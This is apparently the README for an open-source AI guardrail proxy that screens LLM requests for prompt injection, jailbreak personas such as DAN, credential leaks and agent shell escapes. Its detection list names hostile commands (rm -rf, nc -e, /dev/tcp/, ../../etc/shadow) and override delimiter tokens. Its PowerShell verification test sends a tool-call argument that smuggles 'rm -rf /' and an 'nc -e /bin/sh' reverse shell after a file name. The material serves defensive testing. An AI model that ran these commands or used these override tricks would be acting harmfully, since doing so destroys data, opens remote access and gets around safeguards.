# ZeroLabz Sentinel Proxy

> **Sub-millisecond stateless AI guardrail reverse proxy and inference security middleware.**

[![ZeroLabz Sentinel](https://img.shields.io/badge/Security-Zero--Trust%20Guardrail-blue)](https://zrolabz.com)
[![Latency](https://img.shields.io/badge/In--Memory%20p99-0.0058ms-green)](https://github.com/bradglenn6/sentinel-proxy)
[![Cloud Run](https://img.shields.io/badge/Deployment-Google%20Cloud%20Run-blueviolet)](https://cloud.google.com/run)
[![License](https://img.shields.io/badge/License-Apache%202.0-lightgrey)](LICENSE)

Sentinel Proxy intercepts Large Language Model (LLM) threats—including prompt injections, jailbreaks, credential leaks, and autonomous agent escapes—at the network edge in **under 0.4 milliseconds** before tokens reach downstream inference.

---

## Technical Architecture

Sentinel Proxy operates as a transparent, high-performance reverse proxy positioned between client applications and downstream model endpoints (OpenAI, Google Gemini, Anthropic, or local vLLM instances).

```
[ Client Application / Agent ] 
              │  (Inference Request)
              ▼
┌─────────────────────────────────────────────────────────────┐
│                 Sentinel Proxy (Cloud Run / Node)           │
│                                                             │
│  ┌──────────────────────────┐   ┌────────────────────────┐  │
│  │ Fastify Low-Overhead Core│──>│ Stage 1: Fast-Token    │  │
│  │   (HTTP Ingress)         │   │ Hash Set (< 0.05ms)    │  │
│  └──────────────────────────┘   └───────────┬────────────┘  │
│                                             │               │
│                                             ▼               │
│                                 ┌────────────────────────┐  │
│                                 │ Stage 2: Vectorized    │  │
│                                 │ DFA & Regex Scanners   │  │
│                                 └───────────┬────────────┘  │
│                                             │               │
│                                             ▼               │
│                                 ┌────────────────────────┐  │
│                                 │ ZeroLabz Advanced      │  │
│                                 │ Methodology Layer*     │  │
│                                 └────────────────────────┘  │
└──────────────────────────────┬──────────────────────────────┘
                               │  (Sanitized Payload)
                               ▼
                   [ Upstream Model Endpoint ]
```

### Core Architectural Principles

* **Zero I/O Critical Path:** Strictly stateless. Zero database lookups, vector stores, or cross-request locks during synchronous inference.
* **Deterministic Two-Stage Screening:**
  * **Stage 1 (Fast-Tokens):** In-memory hash set screening on tokenized words flags high-risk adversarial indicators in `< 0.05ms`.
  * **Stage 2 (Vectorized DFA):** Pre-compiled regular expressions and automata evaluate prompt structures, delimiter injections, and credential leaks in `< 0.3ms`.
* **Autonomous Agent Boundary Enforcement:** Inspects both `messages[].content` and `tool_calls[].function.arguments` for command chaining, reverse shells, and file-system traversal.
* **Sliding-Window Streaming Interceptor:** SSE transform stream using a 512-character sliding window across chunk boundaries to catch split-token leaks without buffering or degrading Time-To-First-Token (TTFT).

---

## Live Threat Mitigation

### 1. Deterministic Interception Layer (Open Source)
* **Prompt Injection & Delimiter Overrides:** Intercepts attempts to override system instructions (e.g., `<|im_start|>`, `[system]:`, role-framing tokens).
* **Persona Hijacking & Jailbreaks:** Blocks adversarial personas (DAN, Developer Mode, uncensored bypasses).
* **Autonomous Agent Escapes:** Detects shell execution (`rm -rf`, `powershell`, `bash`, `cmd.exe`), reverse network sockets (`/dev/tcp/`, `nc -e`), and directory traversal (`../../etc/shadow`).
* **Credential & Secret Redaction:** Traps raw API keys, bearer tokens, AWS credentials, and PII in-flight.

### 2. ZeroLabz Advanced Methodology Layer
*Advanced threat vectors—including multi-turn semantic evasion, polymorphic jailbreak patterns, and adaptive agentic drift—are evaluated using ZeroLabz advanced methodology.*

To balance extreme local throughput (< 0.4ms) with enterprise threat detection:
* High-speed syntax, token, and tool-call boundary checks execute locally within the proxy.
* Deep behavioral heuristics and continuous threat intelligence feeds are synchronized via [ZeroLabz Sentinel Cloud](https://zrolabz.com).

---

## Empirical Benchmark Performance

Verified via automated 50,000-iteration in-memory microbenchmark (`benchmark/engine_test.js`):

| Benchmark Metric | In-Memory Core (50k Runs) | Live Cloud Run Overhead | Industry Standard | SLA Compliance |
| :--- | :--- | :--- | :--- | :--- |
| **Throughput** | **19,209 req/sec** | Serverless Scalable | ~200 – 1,000 req/sec | **PASS** |
| **p50 Latency** | **0.0021 ms** (2.1 µs) | < 0.20 ms | 20.0 – 80.0 ms | **PASS** |
| **p90 Latency** | **0.0031 ms** (3.1 µs) | < 0.25 ms | 40.0 – 150.0 ms | **PASS** |
| **p99 Latency** | **0.0058 ms** (5.8 µs) | **0.2917 ms** (292 µs) | 50.0 – 250.0 ms | **PASS** (SLA ≤ 4.0ms) |
| **Interception Speed** | **0.0390 ms** (39 µs) | < 0.30 ms | 100.0 – 500.0 ms | **PASS** |

---

## OWASP Top 10 for LLMs Mitigation Matrix

| OWASP Vector | Threat Description | Sentinel Proxy Mitigation Mechanism |
| :--- | :--- | :--- |
| **LLM01: Prompt Injection** | Direct and indirect prompt overrides | Deterministic delimiter scanning and ZeroLabz advanced payload evaluation. |
| **LLM02: Sensitive Info Disclosure** | Accidental egress of secrets and PII | High-speed regex and entropy scanners block or mask credentials in-flight. |
| **LLM06: Excessive Agency** | Rogue agent breakouts and tool misuse | Real-time tool-call payload boundary enforcement and shell escape blocking. |
| **LLM07: System Prompt Leakage** | Exfiltration of proprietary system instructions | Output scanning and token sequence blocking on response streaming. |

---

## Quick Start

### 1. Installation & Build
```powershell
npm install
npm run build
```

### 2. Run Local Service
```powershell
npm run dev
```

### 3. Verification Test (PowerShell)
```powershell
$body = '{"messages":[{"role":"user","content":"Analyze report"}],"tool_calls":[{"id":"call_01","type":"function","function":{"name":"execute_query","arguments":"{\"query\":\"report.pdf; rm -rf / ; nc -e /bin/sh 10.0.0.1 4444\"}"}}]}'

$res = try { 
    Invoke-WebRequest -Uri "http://localhost:8080/v1/chat/completions" `
        -Method Post `
        -Headers @{ "Content-Type" = "application/json"; "Authorization" = "Bearer test-key" } `
        -Body $body `
        -UseBasicParsing 
} catch { $_ }

$res.ErrorDetails.Message
```

### 4. Run Benchmarks
```powershell
node benchmark/engine_test.js
```

---

## Deployment (Google Cloud Run)

```powershell
gcloud run deploy sentinel-proxy `
    --source . `
    --region us-west2 `
    --allow-unauthenticated `
    --memory 512Mi `
    --cpu 1 `
    --set-env-vars UPSTREAM_LLM_URL="https://generativelanguage.googleapis.com"
```

---

## Ecosystem & Support

* **Maintainer:** Bradley Jones, Founder at [ZeroLabz](https://zrolabz.com) (`dev@zrolabz.com`)
* **Live Service Endpoint:** `https://sentinel.zrolabz.com/v1/chat/completions`
